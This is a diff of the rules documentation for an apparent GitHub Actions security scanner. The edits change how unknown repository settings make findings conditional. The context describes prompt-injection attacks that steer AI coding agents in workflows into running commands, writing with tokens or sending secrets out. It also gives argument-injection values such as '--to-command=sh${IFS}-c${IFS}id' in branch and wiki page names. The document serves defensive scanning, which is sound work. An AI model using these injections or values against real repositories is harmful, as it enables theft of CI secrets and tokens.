@@ -23,7 +23,7 @@
   - consequence: the maintainer of the action or of the reusable workflow decides the code that runs, though the repository did not list the action or the reusable workflow as one that the repository trusts: the code of an action runs in the job with the secrets and the GITHUB_TOKEN of the job, and the jobs of a reusable workflow run with the GITHUB_TOKEN of the run and the secrets that the calling job passes
   - remedy: when the repository trusts the maintainer of the action or the reusable workflow, add a pattern that matches the uses to repo.action-list; otherwise, replace the uses with a uses of an action or a reusable workflow that repo.action-list allows
   - severity: high (found from the CVSS metrics below by the table)
-  - fact kinds: repo.action-list (provider: user-supplied, assumed value: none)
+  - fact kinds: repo.action-list (provider: user-supplied)
   - attackers: maintainer-of-called
   - preconditions: listed-trust
   - incidents: agentkit-2025
@@ -222,7 +222,7 @@
   - consequence: the publisher of the image decides what the image holds, though the repository did not list the image as one that the repository trusts: a docker:// step runs the image with the workspace of the job and the environment variables and inputs that the step passes, and the steps of a job whose container is the image run in the image with the secrets and the GITHUB_TOKEN that the steps hold
   - remedy: when the repository trusts the publisher of the image, add a pattern that matches the uses to repo.action-list; otherwise, replace the uses with a uses that repo.action-list allows
   - severity: high (found from the CVSS metrics below by the table)
-  - fact kinds: repo.action-list (provider: user-supplied, assumed value: none)
+  - fact kinds: repo.action-list (provider: user-supplied)
   - attackers: image-publisher
   - preconditions: listed-trust, image-in-job
   - incidents: trivy-image-2026
@@ -301,7 +301,7 @@
   - consequence: the publisher of the image decides what the service runs, though the repository did not list the image as one that the repository trusts: the service reads the environment variables of the service and what the job sends to the service, and sends its responses to the job
   - remedy: when the repository trusts the publisher of the image, add a pattern that matches docker:// and the image to repo.action-list; otherwise, replace the image with one that repo.action-list allows
   - severity: low (found from the CVSS metrics below by the table)
-  - fact kinds: repo.action-list (provider: user-supplied, assumed value: none)
+  - fact kinds: repo.action-list (provider: user-supplied)
   - attackers: image-publisher
   - preconditions: listed-trust, image-in-job
   - true positives:
@@ -975,7 +975,7 @@
   - consequence: an agent an attacker's text steers runs their commands unless the classifier stops them, with the run's token, the secrets in its env, the token actions/checkout leaves in .git/config and, with the sudo of GitHub-hosted runners, the job's secrets in the runner's memory, and sends them out
   - remedy: start the agent in a mode that runs only what its permissions allow (--permission-mode dontAsk, which denies each tool call that the allowed tools do not allow, with the tools the task needs), or run it only on events whose payload holds only what those who can write wrote
   - severity: high (found from the CVSS metrics below by the table)
-  - fact kinds: repo.public (provider: repo-setting, assumed value: true), repo.pull-request-target-allowed (provider: repo-setting, assumed value: true)
+  - fact kinds: repo.public (provider: repo-setting), repo.pull-request-target-allowed (provider: repo-setting)
   - attackers: fork-pr-author, issue-author, commenter, anyone-who-forks
   - preconditions: text-reaches, prompt-steers, classifier-decides, actor-not-author, callers-events
   - true positives:
@@ -1195,7 +1195,7 @@
   - consequence: an agent an attacker's text steers runs their commands, with the run's token, the secrets in its env, the token actions/checkout leaves in .git/config and, with the sudo of GitHub-hosted runners, the job's secrets in the runner's memory, and sends them out
   - remedy: allow only the commands the task needs, with their arguments fixed, and, when the agent has a tool that edits files, do not allow a shell, an interpreter or a build; or run the agent only on events whose payload holds only what those who can write wrote
   - severity: high (found from the CVSS metrics below by the table)
-  - fact kinds: repo.public (provider: repo-setting, assumed value: true), repo.pull-request-target-allowed (provider: repo-setting, assumed value: true)
+  - fact kinds: repo.public (provider: repo-setting), repo.pull-request-target-allowed (provider: repo-setting)
   - attackers: fork-pr-author, issue-author, commenter, anyone-who-forks
   - preconditions: text-reaches, prompt-steers, tool-allowed, actor-not-author, callers-events
   - true positives:
@@ -1435,7 +1435,7 @@
   - consequence: an attacker's text makes the agent comment, label, push or merge wherever the token can write, not only on what it works on
   - remedy: fix the target in the permission (no \*), use tools whose target the action fixes (claude-code-action's use_commit_signing), or give the step a token that writes only what the task needs
   - severity: high (found from the CVSS metrics below by the table)
-  - fact kinds: repo.public (provider: repo-setting, assumed value: true), repo.pull-request-target-allowed (provider: repo-setting, assumed value: true)
+  - fact kinds: repo.public (provider: repo-setting), repo.pull-request-target-allowed (provider: repo-setting)
   - attackers: fork-pr-author, issue-author, commenter, anyone-who-forks
   - preconditions: text-reaches, prompt-steers, tool-allowed, actor-not-author, callers-events
   - true positives:
@@ -1578,7 +1578,7 @@
   - consequence: an attacker's text makes the agent send what it reads, the files of the workspace and of the runner, to the attacker's host
   - remedy: allow fetching only from fixed domains (WebFetch(domain:…)), or not at all
   - severity: high (found from the CVSS metrics below by the table)
-  - fact kinds: repo.public (provider: repo-setting, assumed value: true), repo.pull-request-target-allowed (provider: repo-setting, assumed value: true)
+  - fact kinds: repo.public (provider: repo-setting), repo.pull-request-target-allowed (provider: repo-setting)
   - attackers: fork-pr-author, issue-author, commenter, anyone-who-forks
   - preconditions: text-reaches, prompt-steers, tool-allowed, actor-not-author, callers-events
   - true positives:
@@ -1637,7 +1637,7 @@
   - consequence: closing the quote around the value, the attacker allows the agent any tool or takes its sandbox off, and the agent need not follow them
   - remedy: keep what an attacker writes out of the setting inputs: give it to the agent as text, through the prompt or env, behind the action's check of the actor
   - severity: critical (found from the CVSS metrics below by the table)
-  - fact kinds: repo.public (provider: repo-setting, assumed value: true), repo.pull-request-target-allowed (provider: repo-setting, assumed value: true)
+  - fact kinds: repo.public (provider: repo-setting), repo.pull-request-target-allowed (provider: repo-setting)
   - attackers: fork-pr-author, issue-author, commenter, anyone-who-forks
   - preconditions: attacker-writes, setting-parsed, actor-not-author, callers-events
   - true positives:
@@ -3041,7 +3041,7 @@
 - pull-request-target-blocked: a workflow whose on has pull_request_target and no other event (no workflow_call event either), in a repository whose Actions policies block the runs of the workflow on pull_request_target (repo.pull-request-target-allowed false): an event policy that an administrator sets without pull_request_target among the allowed events, or the default policy that GitHub adds to a public repository without an applicable event policy, from the time when GitHub enforces the default policy on the repository. GitHub's documents say that GitHub evaluates the policies before a run, and that a run that a policy does not allow fails with an error. The documents do not say whether a job of such a run starts before the run fails; the rule assumes that no job of such a run starts
   - finding kinds: ai-action-excessive-tools.auto-mode, ai-action-excessive-tools.run-code, ai-action-excessive-tools.write-token, ai-action-excessive-tools.send-network, ai-action-excessive-tools.setting-value
   - fact kinds:
-    - repo.pull-request-target-allowed (provider: repo-setting, assumed value: true)
+    - repo.pull-request-target-allowed (provider: repo-setting, answer that removes the finding: false)
   - example: pull-request-target-blocked.yml (workflow, false-positive)
     ```yaml
     # situation: on pull_request_target opened, claude-code-action reviews the
@@ -3056,9 +3056,10 @@
     #   run that a policy does not allow fails with an error; the documents do not
     #   say whether a job of such a run starts before the run fails, and the rule
     #   assumes that no job starts.
-    # cause: the rule assumes that a run on pull_request_target starts, unless a
-    #   file of facts or --fact says that the Actions policies block the runs
-    #   (repo.pull-request-target-allowed is assumed true, the worst case).
+    # cause: unless a file of facts or --fact says that the Actions policies block
+    #   runs on pull_request_target (repo.pull-request-target-allowed false), the
+    #   rule reports the finding. When no file of facts and no --fact answers
+    #   repo.pull-request-target-allowed, the finding is conditional.
     # attack: the author of a pull request from a fork writes in its description
     #   an instruction that tells the agent to run a command with Bash.
     # attack-run-behavior: the pull request of the attacker triggers
@@ -3636,7 +3637,7 @@
   - consequence: an agent an attacker's text steers edits a script, a build or a hook, and the later step runs it with what the job holds: its token, its secrets, the network and the runner's sudo
   - remedy: run the agent as the last step of a job of its own, and pass its output to a new job; or check out the workspace again before a step runs its code
   - severity: high (found from the CVSS metrics below by the table)
-  - fact kinds: repo.public (provider: repo-setting, assumed value: true), repo.pull-request-target-allowed (provider: repo-setting, assumed value: true)
+  - fact kinds: repo.public (provider: repo-setting), repo.pull-request-target-allowed (provider: repo-setting)
   - attackers: fork-pr-author, issue-author, commenter, anyone-who-forks
   - preconditions: text-reaches, prompt-steers, residue-runs, actor-not-author, callers-events
   - true positives:
@@ -3891,7 +3892,7 @@
   - consequence: an agent an attacker's text steers leaves a process, a BASH_ENV or a PATH in the environment files, or another action's source, and the later step runs it with its secrets
   - remedy: run the agent as the last step of a job of its own, and pass its output to a new job; keep the secrets of the steps after it out of that job
   - severity: high (found from the CVSS metrics below by the table)
-  - fact kinds: repo.public (provider: repo-setting, assumed value: true), repo.pull-request-target-allowed (provider: repo-setting, assumed value: true)
+  - fact kinds: repo.public (provider: repo-setting), repo.pull-request-target-allowed (provider: repo-setting)
   - attackers: fork-pr-author, issue-author, commenter, anyone-who-forks
   - preconditions: text-reaches, prompt-steers, residue-runs, actor-not-author, callers-events
   - true positives:
@@ -5612,7 +5613,7 @@
 - pull-request-target-blocked: a workflow whose on has pull_request_target and no other event (no workflow_call event either), in a repository whose Actions policies block the runs of the workflow on pull_request_target (repo.pull-request-target-allowed false): an event policy that an administrator sets without pull_request_target among the allowed events, or the default policy that GitHub adds to a public repository without an applicable event policy, from the time when GitHub enforces the default policy on the repository. GitHub's documents say that GitHub evaluates the policies before a run, and that a run that a policy does not allow fails with an error. The documents do not say whether a job of such a run starts before the run fails; the rule assumes that no job of such a run starts
   - finding kinds: ai-action-execution-order.edited-code, ai-action-execution-order.later-secrets
   - fact kinds:
-    - repo.pull-request-target-allowed (provider: repo-setting, assumed value: true)
+    - repo.pull-request-target-allowed (provider: repo-setting, answer that removes the finding: false)
   - example: pull-request-target-blocked.yml (workflow, false-positive)
     ```yaml
     # situation: on pull_request_target opened, a job checks out the base, lets
@@ -5626,9 +5627,10 @@
     #   run that a policy does not allow fails with an error; the documents do not
     #   say whether a job of such a run starts before the run fails, and the rule
     #   assumes that no job starts.
-    # cause: the rule assumes that a run on pull_request_target starts, unless a
-    #   file of facts or --fact says that the Actions policies block the runs
-    #   (repo.pull-request-target-allowed is assumed true, the worst case).
+    # cause: unless a file of facts or --fact says that the Actions policies block
+    #   runs on pull_request_target (repo.pull-request-target-allowed false), the
+    #   rule reports the finding. When no file of facts and no --fact answers
+    #   repo.pull-request-target-allowed, the finding is conditional.
     # attack: the author of a pull request from a fork writes in its description
     #   an instruction that tells the agent to put a command in the scripts of
     #   package.json.
@@ -6046,7 +6048,7 @@
   - consequence: the attacker's text steers the agent over the workflow's prompt: it runs what the step lets it run, with the run's token and the agent's API key, and writes what it is told to
   - remedy: keep what an attacker writes out of the agent: run it only on events whose payload holds only what those who can write wrote, give it the number of the issue and not its text, and allow it only the tools the task needs; moving the value into env does not help, as the agent reads it there
   - severity: high (found from the CVSS metrics below by the table)
-  - fact kinds: repo.public (provider: repo-setting, assumed value: true), repo.pull-request-target-allowed (provider: repo-setting, assumed value: true)
+  - fact kinds: repo.public (provider: repo-setting), repo.pull-request-target-allowed (provider: repo-setting)
   - attackers: fork-pr-author, issue-author, commenter, anyone-who-forks
   - preconditions: attacker-writes, text-in-prompt, actor-not-author, prompt-steers, callers-events
   - true positives:
@@ -6315,7 +6317,7 @@
   - consequence: the agent reads the env through its tools, as the workflow means it to, and the attacker's text in it steers the agent with the run's token and its API key
   - remedy: keep what an attacker writes out of the agent: run it only on events whose payload holds only what those who can write wrote, and allow it only the tools the task needs
   - severity: high (found from the CVSS metrics below by the table)
-  - fact kinds: repo.public (provider: repo-setting, assumed value: true), repo.pull-request-target-allowed (provider: repo-setting, assumed value: true)
+  - fact kinds: repo.public (provider: repo-setting), repo.pull-request-target-allowed (provider: repo-setting)
   - attackers: fork-pr-author, issue-author, commenter, anyone-who-forks
   - preconditions: attacker-writes, agent-reads-env, actor-not-author, prompt-steers, callers-events
   - true positives:
@@ -7413,7 +7415,7 @@
 - pull-request-target-blocked: a workflow whose on has pull_request_target and no other event (no workflow_call event either), in a repository whose Actions policies block the runs of the workflow on pull_request_target (repo.pull-request-target-allowed false): an event policy that an administrator sets without pull_request_target among the allowed events, or the default policy that GitHub adds to a public repository without an applicable event policy, from the time when GitHub enforces the default policy on the repository. GitHub's documents say that GitHub evaluates the policies before a run, and that a run that a policy does not allow fails with an error. The documents do not say whether a job of such a run starts before the run fails; the rule assumes that no job of such a run starts
   - finding kinds: ai-action-prompt-injection.prompt, ai-action-prompt-injection.env
   - fact kinds:
-    - repo.pull-request-target-allowed (provider: repo-setting, assumed value: true)
+    - repo.pull-request-target-allowed (provider: repo-setting, answer that removes the finding: false)
   - example: pull-request-target-blocked.yml (workflow, false-positive)
     ```yaml
     # situation: on pull_request_target opened, codex-action, which lets anyone
@@ -7428,9 +7430,10 @@
     #   run that a policy does not allow fails with an error; the documents do not
     #   say whether a job of such a run starts before the run fails, and the rule
     #   assumes that no job starts.
-    # cause: the rule assumes that a run on pull_request_target starts, unless a
-    #   file of facts or --fact says that the Actions policies block the runs
-    #   (repo.pull-request-target-allowed is assumed true, the worst case).
+    # cause: unless a file of facts or --fact says that the Actions policies block
+    #   runs on pull_request_target (repo.pull-request-target-allowed false), the
+    #   rule reports the finding. When no file of facts and no --fact answers
+    #   repo.pull-request-target-allowed, the finding is conditional.
     # attack: the author of a pull request from a fork writes in its title an
     #   instruction to the agent.
     # attack-run-behavior: the pull request of the attacker triggers
@@ -7825,7 +7828,7 @@
   - consequence: anyone who opens an issue or comments starts the agent with the run's token and the agent's API key, and the prompt they write steers it
   - remedy: list the users who may start the agent, not '\*' nor a value that is the run's actor, or leave the input out so that only those who can write start it
   - severity: high (found from the CVSS metrics below by the table)
-  - fact kinds: repo.pull-request-target-allowed (provider: repo-setting, assumed value: true)
+  - fact kinds: repo.pull-request-target-allowed (provider: repo-setting)
   - attackers: issue-author, commenter, fork-pr-author, anyone-who-forks
   - preconditions: actor-event, prompt-steers, callers-events
   - true positives:
@@ -8248,7 +8251,7 @@
   - consequence: an attacker who opens a pull request from a fork starts the agent with no person approving the run; the agent reads the pull request that the attacker wrote, and the agent has the GITHUB_TOKEN of the labeled run and the API key of the agent
   - remedy: give actions/labeler the GITHUB_TOKEN, as a label that the GITHUB_TOKEN adds starts no workflow run; or start the agent only on a label that a person adds, a label that no workflow of the repository adds
   - severity: high (found from the CVSS metrics below by the table)
-  - fact kinds: repo.pull-request-target-allowed (provider: repo-setting, assumed value: true)
+  - fact kinds: repo.pull-request-target-allowed (provider: repo-setting)
   - attackers: fork-pr-author
   - preconditions: labeler-label, prompt-steers, callers-events
   - true positives:
@@ -8662,14 +8665,14 @@
   - consequence: a GitHub App anyone makes opens an issue or comments on a public repository, and its bot starts the agent with a prompt it writes, past the check of the actor
   - remedy: list the bots you trust in allowed_bots, not '\*' nor a value that is the run's actor, or leave it out
   - severity: high (found from the CVSS metrics below by the table)
-  - fact kinds: repo.public (provider: repo-setting, assumed value: true), repo.pull-request-target-allowed (provider: repo-setting, assumed value: true)
+  - fact kinds: repo.public (provider: repo-setting), repo.pull-request-target-allowed (provider: repo-setting)
   - attackers: issue-author, commenter, fork-pr-author
   - preconditions: actor-event, app-creates, prompt-steers, callers-events
   - true positives:
     - any-bot.yml (workflow, true-positive)
       ```yaml
-      # situation: on issue_comment, a step of claude-code-action has
-      #   allowed_bots '*', in a public repository (repo.public, assumed true).
+      # situation: on issue_comment, a step of claude-code-action has allowed_bots
+      #   '*', in a public repository (repo.public true).
       # reason: a GitHub App anyone makes comments on the public repository, and
       #   the action lets its bot start the agent without checking that it can
       #   write.
@@ -8716,7 +8719,7 @@
   - consequence: anyone who opens an issue or comments starts the agent with the run's token and its API key
   - remedy: limit who starts the agent: run the agent only on events whose payload has nothing an attacker wrote, with a fixed prompt (workflow_dispatch, whose payload the one who dispatches the workflow writes only in the inputs, with a prompt that reads no input), on a label that a maintainer adds, check the actor in the job's if, or use claude-code-action, which checks the actor of the run. The check of the actor does not check the author of the text that the agent reads: the issue that a maintainer labels may still have text that the attacker wrote, so do not put such text in the prompt; ai-action-prompt-injection reports such text
   - severity: high (found from the CVSS metrics below by the table)
-  - fact kinds: repo.pull-request-target-allowed (provider: repo-setting, assumed value: true)
+  - fact kinds: repo.pull-request-target-allowed (provider: repo-setting)
   - attackers: issue-author, commenter, fork-pr-author, anyone-who-forks
   - preconditions: actor-event, prompt-steers, callers-events
   - true positives:
@@ -10192,7 +10195,7 @@
 - pull-request-target-blocked: a workflow whose on has pull_request_target and no other event (no workflow_call event either), in a repository whose Actions policies block the runs of the workflow on pull_request_target (repo.pull-request-target-allowed false): an event policy that an administrator sets without pull_request_target among the allowed events, or the default policy that GitHub adds to a public repository without an applicable event policy, from the time when GitHub enforces the default policy on the repository. GitHub's documents say that GitHub evaluates the policies before a run, and that a run that a policy does not allow fails with an error. The documents do not say whether a job of such a run starts before the run fails; the rule assumes that no job of such a run starts
   - finding kinds: ai-action-unrestricted-trigger.any-user, ai-action-unrestricted-trigger.labeler-token-owner, ai-action-unrestricted-trigger.any-bot, ai-action-unrestricted-trigger.unchecked
   - fact kinds:
-    - repo.pull-request-target-allowed (provider: repo-setting, assumed value: true)
+    - repo.pull-request-target-allowed (provider: repo-setting, answer that removes the finding: false)
   - example: pull-request-target-blocked.yml (workflow, false-positive)
     ```yaml
     # situation: on pull_request_target opened, claude-code-action with a token
@@ -10206,9 +10209,10 @@
     #   run that a policy does not allow fails with an error; the documents do not
     #   say whether a job of such a run starts before the run fails, and the rule
     #   assumes that no job starts.
-    # cause: the rule assumes that a run on pull_request_target starts, unless a
-    #   file of facts or --fact says that the Actions policies block the runs
-    #   (repo.pull-request-target-allowed is assumed true, the worst case).
+    # cause: unless a file of facts or --fact says that the Actions policies block
+    #   runs on pull_request_target (repo.pull-request-target-allowed false), the
+    #   rule reports the finding. When no file of facts and no --fact answers
+    #   repo.pull-request-target-allowed, the finding is conditional.
     # attack: the author of a pull request from a fork writes in its description
     #   an instruction that tells the agent to write with the token.
     # attack-run-behavior: the pull request of the attacker triggers
@@ -10577,7 +10581,7 @@
   - consequence: an agent that text an attacker wrote steers runs any command on the runner, with the network: it reads and sends out the token and the secrets of the step
   - remedy: keep the sandbox (codex: workspace-write or read-only) and the checks of permissions (claude: allowedTools for what the task needs)
   - severity: high (found from the CVSS metrics below by the table)
-  - fact kinds: repo.pull-request-target-allowed (provider: repo-setting, assumed value: true), repo.fork-pr-app-checks (provider: repo-setting, assumed value: true), repo.merge-commit-app-checks (provider: repo-setting, assumed value: true)
+  - fact kinds: repo.pull-request-target-allowed (provider: repo-setting), repo.fork-pr-app-checks (provider: repo-setting), repo.merge-commit-app-checks (provider: repo-setting)
   - attackers: fork-pr-author, issue-author, commenter, anyone-who-forks, merged-commit-author
   - preconditions: text-reaches, callers-events, app-status-check
   - true positives:
@@ -10834,7 +10838,7 @@
   - consequence: an agent that text an attacker wrote steers reads the API key from memory with sudo and prints it, and the steps after it keep sudo
   - remedy: use safety-strategy drop-sudo or unprivileged-user
   - severity: high (found from the CVSS metrics below by the table)
-  - fact kinds: repo.pull-request-target-allowed (provider: repo-setting, assumed value: true), repo.fork-pr-app-checks (provider: repo-setting, assumed value: true), repo.merge-commit-app-checks (provider: repo-setting, assumed value: true)
+  - fact kinds: repo.pull-request-target-allowed (provider: repo-setting), repo.fork-pr-app-checks (provider: repo-setting), repo.merge-commit-app-checks (provider: repo-setting)
   - attackers: fork-pr-author, issue-author, commenter, anyone-who-forks, merged-commit-author
   - preconditions: text-reaches, callers-events, app-status-check
   - true positives:
@@ -11479,7 +11483,7 @@
 - pull-request-target-blocked: a workflow whose on has pull_request_target and no other event (no workflow_call event either), in a repository whose Actions policies block the runs of the workflow on pull_request_target (repo.pull-request-target-allowed false): an event policy that an administrator sets without pull_request_target among the allowed events, or the default policy that GitHub adds to a public repository without an applicable event policy, from the time when GitHub enforces the default policy on the repository. GitHub's documents say that GitHub evaluates the policies before a run, and that a run that a policy does not allow fails with an error. The documents do not say whether a job of such a run starts before the run fails; the rule assumes that no job of such a run starts
   - finding kinds: ai-action-unsafe-sandbox.commands, ai-action-unsafe-sandbox.privileges
   - fact kinds:
-    - repo.pull-request-target-allowed (provider: repo-setting, assumed value: true)
+    - repo.pull-request-target-allowed (provider: repo-setting, answer that removes the finding: false)
   - example: pull-request-target-blocked.yml (workflow, false-positive)
     ```yaml
     # situation: on pull_request_target opened, codex-action answers the pull
@@ -11493,9 +11497,10 @@
     #   run that a policy does not allow fails with an error; the documents do not
     #   say whether a job of such a run starts before the run fails, and the rule
     #   assumes that no job starts.
-    # cause: the rule assumes that a run on pull_request_target starts, unless a
-    #   file of facts or --fact says that the Actions policies block the runs
-    #   (repo.pull-request-target-allowed is assumed true, the worst case).
+    # cause: unless a file of facts or --fact says that the Actions policies block
+    #   runs on pull_request_target (repo.pull-request-target-allowed false), the
+    #   rule reports the finding. When no file of facts and no --fact answers
+    #   repo.pull-request-target-allowed, the finding is conditional.
     # attack: the author of a pull request from a fork writes in its description
     #   an instruction that tells the agent to run a command.
     # attack-run-behavior: the pull request of the attacker triggers
@@ -11751,7 +11756,7 @@
 
 ### threat
 
-- precondition app-status-check: an app outside GitHub Actions, such as an outside CI, makes a commit status or a check run for a commit whose message an attacker writes (a commit of a pull request from a fork, or a commit that merges a pull request; the message of a commit that merges a pull request can have the title of the pull request), and the commit status or the check run starts a run of status, check_suite or check_run, which runs the workflow of the default branch, whatever branch the commit is on. The payload of a run of any of the three events has the SHA of the commit, and the payload of a run of status or check_suite also has the message, the author name and the committer name of the commit. A finding of a workflow whose on has only events among status, check_suite and check_run (one, two or all three) holds only when the fact of the commit is true: repo.fork-pr-app-checks for a commit of a pull request from a fork, and repo.merge-commit-app-checks for a commit that the merge of a pull request puts in a branch of the repository or that a merge queue of the repository makes. A finding kind asks the fact of each kind of commit that its attackers write; the finding of a finding kind that asks both facts holds when at least one of the two facts is true. The rule does not ask these facts of a workflow whose on has another event too, and reports the finding of such a workflow whatever the values of the facts are. The rule assumes each fact to be true unless a file of facts says otherwise
+- precondition app-status-check: an app outside GitHub Actions, such as an outside CI, makes a commit status or a check run for a commit whose message an attacker writes (a commit of a pull request from a fork, or a commit that merges a pull request; the message of a commit that merges a pull request can have the title of the pull request), and the commit status or the check run starts a run of status, check_suite or check_run, which runs the workflow of the default branch, whatever branch the commit is on. The payload of a run of any of the three events has the SHA of the commit, and the payload of a run of status or check_suite also has the message, the author name and the committer name of the commit. A finding of a workflow whose on has only events among status, check_suite and check_run (one, two or all three) holds only when the fact of the commit is true: repo.fork-pr-app-checks for a commit of a pull request from a fork, and repo.merge-commit-app-checks for a commit that the merge of a pull request puts in a branch of the repository or that a merge queue of the repository makes. A finding kind asks the fact of each kind of commit that its attackers write; the finding of a finding kind that asks both facts holds when at least one of the two facts is true. The rule does not ask these facts of a workflow whose on has another event too, and reports the finding of such a workflow whatever the values of the facts are. The finding is conditional when no file of facts and no --fact answers the facts
   - observed: 2026-11-05, runner 2.338.2: a GitHub App made a commit status and a check run for a commit of a pull request from a fork: runs of status, check_suite and check_run started on the default branch, and the message of the commit, with \$( ) in it, was in commit.commit.message of status and in check_suite.head_commit.message of check_suite
   - observed: 2026-11-06, runner 2.338.2: the same again: the SHA of the commit of the pull request was in sha and commit.sha of status, check_suite.head_sha and check_suite.head_commit.id of check_suite, and check_run.head_sha and check_run.check_suite.head_sha of check_run; check_suite.after and check_suite.before were null; the author name and the committer name of the commit, with \$( ) in each, were in the payloads of status and check_suite
   - cites:
@@ -12724,7 +12729,7 @@
   - consequence: the attacker makes the attacker's value start with the name of one of the options that the finding names, followed by a program; the command reads the word as the option whose name starts the word, and runs the program in the step, with whatever the step can reach, such as the secrets and the token in its env, the credentials actions/checkout leaves in .git/config, the network, and sudo on a GitHub-hosted runner
   - remedy: A variable of env and double quotes ("\$X") stop the shell from running the value as code, but the variable and the quotes do not stop the command from reading the value as an option. In either fix below, keep the value in the variable of env, and pass the variable to the command inside double quotes. Then either put the word that ends the command's options (--; --end-of-options for git) after the last option the command needs and before the value, for example right before the value (tar -xf archive.tar notes.txt -- "\$X"), so that the command reads every word after that word as a plain argument; or, before the command, end the step with an error when the value starts with -, such as &#91;&#91; \$X != -\* ]] || exit 1 for the variable X that holds the value. The shell check &#91;&#91; \$X != -\* ]] works only when the command gets the value inside double quotes: when the command gets the value outside quotes, a blank in the value starts a new word, and the new word can start with -. For make, -- is not enough: make reads a word of the form NAME=value as the assignment of a variable even after --, so for make end the step with an error when the value starts with - or contains =, such as &#91;&#91; \$X != -\* && \$X != \*=\* ]] || exit 1
   - severity: critical (found from the CVSS metrics below by the table)
-  - fact kinds: repo.pull-request-target-allowed (provider: repo-setting, assumed value: true), repo.fork-pr-app-checks (provider: repo-setting, assumed value: true), repo.merge-commit-app-checks (provider: repo-setting, assumed value: true)
+  - fact kinds: repo.pull-request-target-allowed (provider: repo-setting), repo.fork-pr-app-checks (provider: repo-setting), repo.merge-commit-app-checks (provider: repo-setting)
   - attackers: fork-pr-author, issue-author, commenter, merged-commit-author, anyone-who-forks
   - preconditions: option-anywhere, option-runs-program, attacker-dash, attacker-event, callers-events, app-status-check
   - true positives:
@@ -13164,7 +13169,7 @@
   - consequence: the attacker makes the attacker's value start with the name of one of the options that the finding names, followed by a program; the command reads the word as the option whose name starts the word, and runs the program in the step, with whatever the step can reach, such as the secrets and the token in its env, the credentials actions/checkout leaves in .git/config, the network, and sudo on a GitHub-hosted runner
   - remedy: A variable of env and double quotes ("\$X") stop the shell from running the value as code, but the variable and the quotes do not stop the command from reading the value as an option. In either fix below, keep the value in the variable of env, and pass the variable to the command inside double quotes. Then either put the word that ends the command's options (--; --end-of-options for git) after the last option the command needs and before the value, for example right before the value (tar -xf archive.tar notes.txt -- "\$X"), so that the command reads every word after that word as a plain argument; or, before the command, end the step with an error when the value starts with -, such as &#91;&#91; \$X != -\* ]] || exit 1 for the variable X that holds the value. The shell check &#91;&#91; \$X != -\* ]] works only when the command gets the value inside double quotes: when the command gets the value outside quotes, a blank in the value starts a new word, and the new word can start with -. For make, -- is not enough: make reads a word of the form NAME=value as the assignment of a variable even after --, so for make end the step with an error when the value starts with - or contains =, such as &#91;&#91; \$X != -\* && \$X != \*=\* ]] || exit 1
   - severity: critical (found from the CVSS metrics below by the table)
-  - fact kinds: repo.wiki-open (provider: repo-setting, assumed value: true)
+  - fact kinds: repo.wiki-open (provider: repo-setting)
   - attackers: wiki-editor
   - preconditions: option-anywhere, option-runs-program, attacker-dash, attacker-event, callers-events, wiki-open
   - true positives:
@@ -13174,13 +13179,13 @@
       #   the wiki page (page_name) to tar after the file names, through env and
       #   inside quotes.
       # reason: anyone may edit the wiki when the wiki is open to all
-      #   (repo.wiki-open, assumed true). For a page made on the web interface,
-      #   GitHub makes the name of the page from the title, turns each +, < and >
-      #   of the title into a -, and turns each blank of the title into a - after
-      #   trimming the blanks at the head and the end of the title, so the editor
-      #   of the wiki makes the name begin with -, and tar reads a word that begins with - as an option even
-      #   after the file names of tar. Double quotes keep the name as one word
-      #   but do not stop tar from reading the word as an option. The title
+      #   (repo.wiki-open true). For a page made on the web interface, GitHub makes
+      #   the name of the page from the title, turns each +, < and > of the title
+      #   into a -, and turns each blank of the title into a - after trimming the
+      #   blanks at the head and the end of the title, so the editor of the wiki
+      #   makes the name begin with -, and tar reads a word that begins with - as an
+      #   option even after the file names of tar. Double quotes keep the name as
+      #   one word but do not stop tar from reading the word as an option. The title
       #   ++to+command=id makes the name --to-command=id.
       # attack-value: github.event.pages[0].page_name = "--to-command=id"
       # attack-run-behavior: tar reads the word as --to-command and runs id for
@@ -15075,7 +15080,7 @@
 - pull-request-target-blocked: a workflow whose on has pull_request_target and no other event (no workflow_call event either), in a repository whose Actions policies block the runs of the workflow on pull_request_target (repo.pull-request-target-allowed false): an event policy that an administrator sets without pull_request_target among the allowed events, or the default policy that GitHub adds to a public repository without an applicable event policy, from the time when GitHub enforces the default policy on the repository. GitHub's documents say that GitHub evaluates the policies before a run, and that a run that a policy does not allow fails with an error. The documents do not say whether a job of such a run starts before the run fails; the rule assumes that no job of such a run starts
   - finding kinds: argument-injection.option
   - fact kinds:
-    - repo.pull-request-target-allowed (provider: repo-setting, assumed value: true)
+    - repo.pull-request-target-allowed (provider: repo-setting, answer that removes the finding: false)
   - example: pull-request-target-blocked.yml (workflow, false-positive)
     ```yaml
     # situation: on pull_request_target, a step extracts an archive and passes
@@ -15090,9 +15095,10 @@
     #   run that a policy does not allow fails with an error; the documents do not
     #   say whether a job of such a run starts before the run fails, and the rule
     #   assumes that no job starts.
-    # cause: the rule assumes that a run on pull_request_target starts, unless a
-    #   file of facts or --fact says that the Actions policies block the runs
-    #   (repo.pull-request-target-allowed is assumed true, the worst case).
+    # cause: unless a file of facts or --fact says that the Actions policies block
+    #   runs on pull_request_target (repo.pull-request-target-allowed false), the
+    #   rule reports the finding. When no file of facts and no --fact answers
+    #   repo.pull-request-target-allowed, the finding is conditional.
     # attack-value: github.head_ref = "--to-command=sh${IFS}-c${IFS}id"
     # attack-run-behavior: the pull request of the attacker triggers
     #   pull_request_target, and the run fails with an error, and no job of the
@@ -15273,7 +15279,7 @@
   - observed: 2026-09-25, runner 2.337.0: a pull_request run took its workflow from the pull request's branch
   - cites:
     - <https://docs.github.com/en/actions/reference/security/securely-using-pull_request_target>
-- precondition app-status-check: an app outside GitHub Actions, such as an outside CI, makes a commit status or a check run for a commit whose message an attacker writes (a commit of a pull request from a fork, or a commit that merges a pull request; the message of a commit that merges a pull request can have the title of the pull request), and the commit status or the check run starts a run of status, check_suite or check_run, which runs the workflow of the default branch, whatever branch the commit is on. The payload of a run of any of the three events has the SHA of the commit, and the payload of a run of status or check_suite also has the message, the author name and the committer name of the commit. A finding of a workflow whose on has only events among status, check_suite and check_run (one, two or all three) holds only when the fact of the commit is true: repo.fork-pr-app-checks for a commit of a pull request from a fork, and repo.merge-commit-app-checks for a commit that the merge of a pull request puts in a branch of the repository or that a merge queue of the repository makes. A finding kind asks the fact of each kind of commit that its attackers write; the finding of a finding kind that asks both facts holds when at least one of the two facts is true. The rule does not ask these facts of a workflow whose on has another event too, and reports the finding of such a workflow whatever the values of the facts are. The rule assumes each fact to be true unless a file of facts says otherwise
